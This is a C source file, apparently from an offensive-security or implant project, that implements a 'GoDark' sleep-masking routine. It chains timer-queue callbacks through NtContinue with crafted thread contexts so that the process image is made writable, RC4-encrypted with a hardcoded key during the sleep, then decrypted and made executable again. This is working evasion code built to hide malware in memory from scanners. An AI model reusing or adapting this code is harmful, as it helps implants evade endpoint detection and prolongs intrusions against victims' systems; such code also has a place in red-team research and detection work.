#include "SleepMasking.h"

void GoDark(INT sleepTime) {
    printf("\n[*] Going Dark for : %d ms\n", sleepTime);

    HANDLE SelfHeap = GetProcessHeap();
    CONTEXT* CtxArray = (CONTEXT*)HeapAlloc(SelfHeap, HEAP_ZERO_MEMORY, sizeof(CONTEXT) * 7);
    if (!CtxArray) return;

    CONTEXT* CtxThread = &CtxArray[0];
    CONTEXT* RopProtRW = &CtxArray[1];
    CONTEXT* RopMemEnc = &CtxArray[2];
    CONTEXT* RopDelay  = &CtxArray[3];
    CONTEXT* RopMemDec = &CtxArray[4];
    CONTEXT* RopProtRX = &CtxArray[5];
    CONTEXT* RopSetEvt = &CtxArray[6];

    DWORD OldProtect = 0;
    HANDLE hEvent = CreateEventW(NULL, FALSE, FALSE, NULL); //TODO : Wrapper broken arrrrrgggggghhhh
    PVOID ImageBase = CustomGetModuleHandleW(NULL);
    //printf("[*] ImageBase at %p\n", ImageBase);
    
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)ImageBase + ((PIMAGE_DOS_HEADER)ImageBase)->e_lfanew);
    DWORD ImageSize = ntHeader->OptionalHeader.SizeOfImage;

    _SystemFunction032 SysFunc032 = (_SystemFunction032)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction032");
    PVOID NtContinue = CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "NtContinue");
    PVOID RtlExitUserThread = CustomGetProcAddress(CustomGetModuleHandleW(L"ntdll.dll"), "RtlExitUserThread");

    //printf("[*] Initialization complete. Setting up ROP chain...\n");

    USTRING* pKey = (USTRING*)HeapAlloc(SelfHeap, HEAP_ZERO_MEMORY, sizeof(USTRING));
    USTRING* pImg = (USTRING*)HeapAlloc(SelfHeap, HEAP_ZERO_MEMORY, sizeof(USTRING));

    pKey->Buffer = HeapAlloc(SelfHeap, HEAP_ZERO_MEMORY, 16);
    memcpy(pKey->Buffer, "rzdhop_is_nice!", 16);
    pKey->Length = 16;
    pKey->MaximumLength = 16;

    pImg->Buffer = ImageBase;
    pImg->Length = ImageSize;
    pImg->MaximumLength = ImageSize;

    HANDLE hTimer = NULL;
    //printf("[*] Capturing initial thread context...\n");

    // Pass NULL as the queue handle to safely use the default Thread Pool
    CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)RtlCaptureContext, CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD);
    Sleep(50); 

    if (CtxThread->Rsp == 0) {
        printf("[!] Error: RtlCaptureContext failed.\n");
        return;
    }

    // Macro sets up the Context: 
    // - Allow 8 bytes on RSP forthe return address
    // - Writes the return address
    #define SETUP_CONTEXT(ctx, func, p1, p2, p3, p4) \
        memcpy(ctx, CtxThread, sizeof(CONTEXT)); \
        ctx->Rsp -= 8; \
        *(DWORD64*)(ctx->Rsp) = (DWORD64)RtlExitUserThread; \
        ctx->Rip = (DWORD64)func; \
        ctx->Rcx = (DWORD64)p1; \
        ctx->Rdx = (DWORD64)p2; \
        ctx->R8  = (DWORD64)p3; \
        ctx->R9  = (DWORD64)p4;

    SETUP_CONTEXT(RopProtRW, VirtualProtect, ImageBase, ImageSize, PAGE_READWRITE, &OldProtect);
    SETUP_CONTEXT(RopMemEnc, SysFunc032, pImg, pKey, 0, 0);
    SETUP_CONTEXT(RopDelay, WaitForSingleObject, GetCurrentProcess(), sleepTime, 0, 0);
    SETUP_CONTEXT(RopMemDec, SysFunc032, pImg, pKey, 0, 0);
    SETUP_CONTEXT(RopProtRX, VirtualProtect, ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect);
    SETUP_CONTEXT(RopSetEvt, SetEvent, hEvent, 0, 0, 0);

    //printf("[!] Triggering ROP Chain Timers...\n");
    
    // Pass NULL instead of hTimerQueue
    CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)NtContinue, RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)NtContinue, RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)NtContinue, RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD);

    DWORD postDelay = 400 + sleepTime;
    CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)NtContinue, RopMemDec, postDelay, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)NtContinue, RopProtRX, postDelay + 100, 0, WT_EXECUTEINTIMERTHREAD);
    CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)NtContinue, RopSetEvt, postDelay + 200, 0, WT_EXECUTEINTIMERTHREAD);

    //printf("[*] Main thread sleeping, waiting for decryption...\n");
    WaitForSingleObject(hEvent, INFINITE);
    
    //printf("[+] Event signaled! Memory decrypted.\n");

    // Cleanup
    HeapFree(SelfHeap, 0, pKey->Buffer);
    HeapFree(SelfHeap, 0, pKey);
    HeapFree(SelfHeap, 0, pImg);
    HeapFree(SelfHeap, 0, CtxArray);
}